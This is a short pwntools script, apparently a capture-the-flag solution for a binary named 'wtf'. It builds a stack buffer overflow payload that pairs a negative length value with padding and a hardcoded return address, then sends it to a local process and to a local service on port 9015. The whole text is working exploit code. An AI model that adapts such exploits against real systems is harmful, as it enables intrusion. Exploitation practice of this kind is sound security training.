#!/usr/bin/env python

from pwn import *
import time

payload = '-1' + ' '*4094 + 'a'*(0x30 + 8) + p64(0x4005F4) + '\n'

p = process('./wtf')
p.send(payload)
log.success(p.recvall())

p = remote('localhost', 9015)
p.recvuntil('payload please : ')
p.sendline(payload.encode('hex'))
print p.recvall()
